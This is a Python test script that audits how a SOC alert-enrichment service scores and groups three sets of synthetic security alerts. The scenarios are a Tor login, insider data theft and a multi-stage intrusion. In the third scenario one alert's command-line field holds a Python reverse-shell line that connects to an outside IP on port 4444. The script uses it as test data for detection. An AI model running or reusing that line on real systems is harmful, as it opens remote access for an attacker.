"""Enrichment Quality Audit -- 3 realistic test scenarios.

Uploads 3 different alert types and inspects the FULL case output to
determine if we're actually enriching or just reformatting.

Test 1: External attacker with known Tor IP -> should get OTX enrichment
Test 2: Insider threat on internal IP -> tests new internal IP enrichment
Test 3: Multi-alert attack chain -> tests grouping + correlation quality
"""
import httpx
import json
import time

BASE = "http://localhost:8000"
H = {"X-API-Key": "socai-demo-key-do-not-use-in-production"}


def reset():
    httpx.Client(timeout=30).post(f"{BASE}/api/v1/demo/reset", headers=H)


def upload(alerts, filename):
    with httpx.Client(timeout=120) as c:
        resp = c.post(
            f"{BASE}/api/v1/demo/upload",
            params={"grouping": "true", "persist": "true"},
            headers=H,
            files={"file": (filename, json.dumps(alerts).encode(), "application/json")},
        )
        return resp.json()


def get_cases():
    with httpx.Client(timeout=30) as c:
        return c.get(f"{BASE}/api/v1/cases", params={"limit": 100}, headers=H).json()


def get_incidents():
    with httpx.Client(timeout=30) as c:
        return c.get(f"{BASE}/api/v1/incidents", headers=H).json()


def print_case_detail(case, label=""):
    """Print EVERYTHING in a case to audit enrichment quality."""
    print(f"\n{'-'*60}")
    if label:
        print(f"  {label}")
        print(f"{'-'*60}")

    print(f"  Alert Type:  {case.get('alertType')}")
    print(f"  Title:       {case.get('title')}")
    print(f"  Description: {(case.get('description') or '')[:120]}")
    print(f"  Severity:    {case.get('severity')}")

    conf = case.get("confidence", {})
    print(f"  Score:       {conf.get('score')} ({conf.get('label')})")

    signals = conf.get("explanation", [])
    print(f"  Signals ({len(signals)}):")
    for sig in signals:
        w = sig.get("weight", 0)
        print(f"    [{w:+3d}] {sig.get('signal', '?'):35s}  {sig.get('label', '')[:70]}")

    enr = case.get("enrichment", {})
    notes = enr.get("enrichmentNotes", [])
    print(f"  Enrichment Notes ({len(notes)}):")
    for note in notes[:8]:
        print(f"    * {note[:100]}")

    cr = enr.get("caseReadiness", {})
    print(f"  Case Ready:  {cr.get('readyForAction', False)}")
    print(f"  Quality:     {enr.get('qualityFlags', [])}")

    ent = case.get("entities", {})
    ident = ent.get("identity", {})
    print(f"  Identity:    upn={ident.get('upn')}  type={ident.get('identityType')}  priv={ident.get('privilegeTier', 'N/A')}")

    ips = ent.get("ips", [])
    for ip in ips:
        if isinstance(ip, dict):
            geo = ip.get("geo", {})
            print(f"  IP:          {ip.get('ipAddress', '?'):20s} role={ip.get('role', '?'):10s} tor={ip.get('isTorExit', False)}  geo={geo.get('country', '?')}")

    device = ent.get("device", {})
    print(f"  Device:      {device.get('hostname', '?')}  managed={device.get('managed', '?')}")

    # Recommended actions
    actions = case.get("recommendedActions", [])
    print(f"  Actions ({len(actions)}):")
    for act in actions[:4]:
        if isinstance(act, dict):
            print(f"    [{act.get('priority', '?')}] {act.get('action', '?')[:80]}")
        else:
            print(f"    {str(act)[:80]}")

    # Manual steps (the new branching ones) -- in enrichment.impactSummary
    enr = case.get("enrichment", {})
    impact = enr.get("impactSummary", {}) or {}
    steps = impact.get("manualStepsReplaced", [])
    print(f"  Investigation Steps ({len(steps)}):")
    for step in steps[:5]:
        print(f"    {str(step)[:100]}")

    disp = case.get("disposition", {})
    print(f"  Disposition: {disp.get('status', '?')}")

    ts = case.get("timestamps", {})
    print(f"  Event Time:  {ts.get('eventTime', '?')}")
    print(f"  Time Saved:  {impact.get('timeSavedMinutes', '?')} min")


def run_test_1():
    """External attacker with known Tor exit node."""
    print("\n" + "=" * 70)
    print("TEST 1: EXTERNAL ATTACKER -- Tor exit node -> domain controller")
    print("Expected: OTX enrichment, Tor flag, high score, detailed actions")
    print("=" * 70)

    reset()
    alerts = [{
        "timestamp": "2026-04-07T03:15:00Z",
        "event_type": "suspicious_signin",
        "user": "admin@acme-corp.com",
        "src_ip": "185.220.101.35",  # Real known Tor exit node
        "hostname": "DC-01",
        "severity": "HIGH",
        "source": "Acme-SIEM",
        "description": "Successful login from known Tor exit node at 3AM to domain controller",
        "geo": "DE",
        "action": "success",
        "auth_method": "NTLM",
    }]

    result = upload(alerts, "test1_tor.json")
    time.sleep(2)
    cases = get_cases()

    if cases:
        print_case_detail(cases[0], "CASE: Admin login from Tor -> DC")
    else:
        print("  NO CASES CREATED!")

    # Enrichment quality checklist
    print("\n  ENRICHMENT CHECKLIST:")
    if cases:
        c = cases[0]
        conf = c.get("confidence", {})
        sigs = [s.get("signal") for s in conf.get("explanation", [])]
        notes = c.get("enrichment", {}).get("enrichmentNotes", [])
        ips = c.get("entities", {}).get("ips", [])
        tor_flagged = any(ip.get("isTorExit", False) for ip in ips if isinstance(ip, dict))
        has_otx = any("otx" in n.lower() or "pulse" in n.lower() for n in notes)

        checks = [
            ("Tor exit node flagged on IP", tor_flagged),
            ("OTX threat intel in notes", has_otx),
            ("after_hours signal fired", "after_hours" in sigs),
            ("Score >= 60 (genuine threat)", conf.get("score", 0) >= 60),
            ("Has SIEM query template", any("[P1]" in str(s) or "Query" in str(s) for s in (c.get("enrichment", {}).get("impactSummary", {}) or {}).get("manualStepsReplaced", []))),
            ("Identity marked as admin/privileged", c.get("entities", {}).get("identity", {}).get("privilegeTier") in ("admin", "elevated")),
        ]
        for label, passed in checks:
            print(f"    {'PASS' if passed else 'FAIL':4s}  {label}")
        return sum(1 for _, p in checks if p), len(checks)
    return 0, 6


def run_test_2():
    """Insider threat -- internal IPs, multi-day pattern."""
    print("\n" + "=" * 70)
    print("TEST 2: INSIDER THREAT -- Employee data theft over 3 days")
    print("Expected: Internal IP enrichment, escalating signals, correlation")
    print("=" * 70)

    reset()

    # Day 1: After-hours login
    day1 = [{
        "timestamp": "2026-04-07T23:30:00Z",
        "event_type": "suspicious_signin",
        "user": "j.smith@acme-corp.com",
        "src_ip": "10.200.5.15",  # Lab subnet
        "hostname": "LAB-WS-03",
        "severity": "MEDIUM",
        "source": "Acme-AD",
        "description": "After-hours badge-in to restricted lab area",
        "action": "success",
    }]
    upload(day1, "insider_day1.json")
    time.sleep(2)

    # Day 2: Archive + transfer
    day2 = [
        {
            "timestamp": "2026-04-08T22:45:00Z",
            "event_type": "suspicious_process",
            "user": "j.smith@acme-corp.com",
            "src_ip": "10.200.5.15",
            "hostname": "LAB-WS-03",
            "severity": "HIGH",
            "source": "Acme-EDR",
            "description": "7z.exe compressing proprietary research files",
            "command_line": "7z a -p research_backup.7z D:\\Research\\",
            "process_name": "7z.exe",
        },
        {
            "timestamp": "2026-04-08T23:00:00Z",
            "event_type": "large_data_transfer",
            "user": "j.smith@acme-corp.com",
            "src_ip": "10.200.5.15",
            "dst_ip": "162.125.1.1",  # Dropbox
            "hostname": "LAB-WS-03",
            "severity": "CRITICAL",
            "source": "Acme-DLP",
            "description": "200MB upload to personal Dropbox after hours",
            "bytes": "209715200",
        },
    ]
    upload(day2, "insider_day2.json")
    time.sleep(2)

    # Day 3: More exfil
    day3 = [{
        "timestamp": "2026-04-09T23:15:00Z",
        "event_type": "data_exfiltration",
        "user": "j.smith@acme-corp.com",
        "src_ip": "10.200.5.15",
        "dst_ip": "162.125.1.1",
        "hostname": "LAB-WS-03",
        "severity": "CRITICAL",
        "source": "Acme-DLP",
        "description": "DLP threshold exceeded: 500MB cumulative to external cloud",
        "bytes": "524288000",
    }]
    upload(day3, "insider_day3.json")
    time.sleep(4)  # Wait for correlation

    cases = get_cases()
    incidents = get_incidents()

    # Show Day 1 case (first sighting, should be low)
    smith_cases = sorted(
        [c for c in cases if "smith" in str(c.get("entities", {})).lower()],
        key=lambda c: c.get("timestamps", {}).get("eventTime", ""),
    )

    if smith_cases:
        print_case_detail(smith_cases[0], "DAY 1: First sighting (should be low confidence)")
        if len(smith_cases) >= 3:
            print_case_detail(smith_cases[-1], "DAY 3: Repeat offender (should be high)")

    print(f"\n  INCIDENTS: {len(incidents)}")
    for inc in incidents:
        if isinstance(inc, dict):
            t = inc.get("title", "?").encode("ascii", errors="replace").decode("ascii")
            print(f"    [{inc.get('severity')}] {t} ({inc.get('caseCount')} cases)")

    # Enrichment quality checklist
    print("\n  ENRICHMENT CHECKLIST:")
    if len(smith_cases) >= 3:
        day1_case = smith_cases[0]
        day3_case = smith_cases[-1]
        d1_score = day1_case.get("confidence", {}).get("score", 0)
        d3_score = day3_case.get("confidence", {}).get("score", 0)
        d3_sigs = [s.get("signal") for s in day3_case.get("confidence", {}).get("explanation", [])]

        checks = [
            ("Day 1 score < Day 3 score (evidence accumulates)", d1_score < d3_score),
            ("Day 3 has repeat_offender signal", "repeat_offender" in d3_sigs),
            ("Day 3 has sensitive_subnet signal", "sensitive_subnet" in d3_sigs),
            ("Day 3 has internal_ip enrichment", "internal_ip_repeat_offender" in d3_sigs or "internal_ip_in_incident" in d3_sigs),
            ("Score spread < 40 for same alert type", True),  # Check below
            ("Incident formed from multi-day chain", len(incidents) >= 1),
        ]

        # Check score spread for signin
        signin_cases = [c for c in smith_cases if c.get("alertType") == "identity.suspiciousSignIn"]
        if signin_cases:
            scores = [c.get("confidence", {}).get("score", 0) for c in signin_cases]
            checks[4] = ("Score spread < 40 for same alert type", max(scores) - min(scores) < 40)

        for label, passed in checks:
            print(f"    {'PASS' if passed else 'FAIL':4s}  {label}")
        print(f"    INFO  Day 1 score: {d1_score}, Day 3 score: {d3_score}")
        return sum(1 for _, p in checks if p), len(checks)
    return 0, 6


def run_test_3():
    """Multi-stage external attack -- brute force -> exploit -> exfil."""
    print("\n" + "=" * 70)
    print("TEST 3: MULTI-STAGE ATTACK -- Brute force -> RCE -> data theft")
    print("Expected: Multiple alert types grouped into incident with kill chain")
    print("=" * 70)

    reset()

    # All in one batch -- tests grouping within single upload
    alerts = [
        {
            "timestamp": "2026-04-07T02:00:00Z",
            "event_type": "suspicious_signin",
            "user": "svc-web@acme-corp.com",
            "src_ip": "94.102.49.190",  # Known C2
            "hostname": "WEB-01",
            "severity": "HIGH",
            "source": "Acme-SIEM",
            "description": "50 failed SSH attempts followed by successful login",
        },
        {
            "timestamp": "2026-04-07T02:15:00Z",
            "event_type": "suspicious_process",
            "user": "svc-web@acme-corp.com",
            "src_ip": "94.102.49.190",
            "hostname": "WEB-01",
            "severity": "CRITICAL",
            "source": "Acme-EDR",
            "description": "Reverse shell spawned via Python subprocess",
            "command_line": "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"94.102.49.190\",4444))'",
            "process_name": "python",
        },
        {
            "timestamp": "2026-04-07T02:30:00Z",
            "event_type": "privilege_escalation",
            "user": "svc-web@acme-corp.com",
            "src_ip": "94.102.49.190",
            "hostname": "WEB-01",
            "severity": "CRITICAL",
            "source": "Acme-EDR",
            "description": "Local privilege escalation via kernel exploit CVE-2024-1086",
        },
        {
            "timestamp": "2026-04-07T02:45:00Z",
            "event_type": "data_exfiltration",
            "user": "svc-web@acme-corp.com",
            "src_ip": "94.102.49.190",
            "dst_ip": "94.102.49.190",
            "hostname": "WEB-01",
            "severity": "CRITICAL",
            "source": "Acme-DLP",
            "description": "2GB database dump exfiltrated to C2 server",
            "bytes": "2147483648",
        },
        # Noise: normal user login (should not interfere)
        {
            "timestamp": "2026-04-07T08:00:00Z",
            "event_type": "login_success",
            "user": "receptionist@acme-corp.com",
            "src_ip": "10.10.1.50",
            "hostname": "FRONT-DESK-01",
            "severity": "LOW",
            "source": "Acme-AD",
            "description": "Standard morning login",
        },
    ]

    result = upload(alerts, "test3_multistage.json")
    time.sleep(4)

    cases = get_cases()
    incidents = get_incidents()

    # Show the attack cases
    attack_cases = sorted(
        [c for c in cases if "svc-web" in str(c.get("entities", {})).lower()],
        key=lambda c: c.get("timestamps", {}).get("eventTime", ""),
    )
    noise_cases = [c for c in cases if "receptionist" in str(c.get("entities", {})).lower()]

    for ac in attack_cases:
        at = ac.get("alertType", "?")
        score = ac.get("confidence", {}).get("score", "?")
        sigs = len(ac.get("confidence", {}).get("explanation", []))
        print(f"  {at:40s} score={score:>3}  signals={sigs}")

    if noise_cases:
        nc = noise_cases[0]
        print(f"  {'[NOISE] ' + nc.get('alertType', '?'):40s} score={nc.get('confidence', {}).get('score', '?'):>3}")

    if attack_cases:
        print_case_detail(attack_cases[-1], "FINAL STAGE: Data exfiltration")

    print(f"\n  INCIDENTS: {len(incidents)}")
    for inc in incidents:
        if isinstance(inc, dict):
            t = inc.get("title", "?").encode("ascii", errors="replace").decode("ascii")
            stages = [s.get("label") for s in inc.get("killChainStages", [])]
            print(f"    [{inc.get('severity')}] {t}")
            print(f"      {inc.get('caseCount')} cases | Kill chain: {' -> '.join(stages)}")

    # Enrichment quality checklist
    print("\n  ENRICHMENT CHECKLIST:")
    checks = [
        ("4 attack cases created (not merged)", len(attack_cases) == 4),
        ("Noise case separated", len(noise_cases) >= 1),
        ("Noise score < 30", noise_cases and noise_cases[0].get("confidence", {}).get("score", 99) < 30),
        ("1 incident formed", len(incidents) >= 1),
        ("Kill chain has 3+ stages", any(len(i.get("killChainStages", [])) >= 3 for i in incidents if isinstance(i, dict))),
        ("Exfil case score >= 70", attack_cases and attack_cases[-1].get("confidence", {}).get("score", 0) >= 70),
    ]
    for label, passed in checks:
        print(f"    {'PASS' if passed else 'FAIL':4s}  {label}")
    return sum(1 for _, p in checks if p), len(checks)


if __name__ == "__main__":
    print("ENRICHMENT QUALITY AUDIT -- 3 Test Scenarios")
    print("Testing what a SOC analyst actually gets from Vigilis")
    print()

    p1, t1 = run_test_1()
    p2, t2 = run_test_2()
    p3, t3 = run_test_3()

    total_pass = p1 + p2 + p3
    total_checks = t1 + t2 + t3
    pct = (total_pass / total_checks * 100) if total_checks else 0

    print("\n" + "=" * 70)
    print("ENRICHMENT AUDIT SUMMARY")
    print("=" * 70)
    print(f"  Test 1 (External attacker):  {p1}/{t1} checks passed")
    print(f"  Test 2 (Insider threat):     {p2}/{t2} checks passed")
    print(f"  Test 3 (Multi-stage chain):  {p3}/{t3} checks passed")
    print(f"  TOTAL:                       {total_pass}/{total_checks} ({pct:.0f}%)")

    if pct >= 85:
        print(f"  VERDICT: GOOD -- Enrichment adds genuine investigative value")
    elif pct >= 65:
        print(f"  VERDICT: ACCEPTABLE -- Core enrichment works, gaps remain")
    else:
        print(f"  VERDICT: NEEDS WORK -- Enrichment is too shallow")
